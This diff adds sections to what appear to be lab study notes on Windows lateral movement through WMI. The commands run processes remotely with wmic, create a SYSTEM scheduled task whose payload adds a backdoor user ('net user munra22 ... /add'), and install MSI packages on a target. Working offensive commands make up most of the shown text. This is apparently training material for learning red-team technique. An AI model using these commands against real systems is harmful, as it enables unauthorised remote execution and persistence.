@@ -48,7 +48,6 @@ On legacy systems, the same can be done using wmic from the command prompt:
 wmic.exe /user:Administrator /password:Mypass123 /node:{TARGET} process call create "cmd.exe /c calc.exe" 
 ```
 
-
 ## Remote Services Creation with WMI
 - **Ports:**
     - 135/TCP, 49152-65535/TCP (DCERPC)
@@ -79,7 +78,6 @@ Invoke-CimMethod -InputObject $Service -MethodName StopService
 Invoke-CimMethod -InputObject $Service -MethodName Delete
 ```
 
-
 ## Remote Scheduled Tasks Creation with WMI
 - **Ports:**
     - 135/TCP, 49152-65535/TCP (DCERPC)
@@ -87,7 +85,36 @@ Invoke-CimMethod -InputObject $Service -MethodName Delete
 - **Required Group Memberships:** Administrators
 
 We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:
+```powershell
+# Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add" # Your payload
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
+Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+To delete the scheduled task after it has been used, we can use the following command:
+  ```powershell
+Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+## Installing MSI packages through WMI
+- **Ports:**
+    - 135/TCP, 49152-65535/TCP (DCERPC)
+    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- **Required Group Memberships:** Administrators
+
+MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:
+```powershell
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+```
+
+We can achieve the same by us using wmic in legacy systems:
+```shell-session
+wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+```
 
 
-  
- 
+## Example
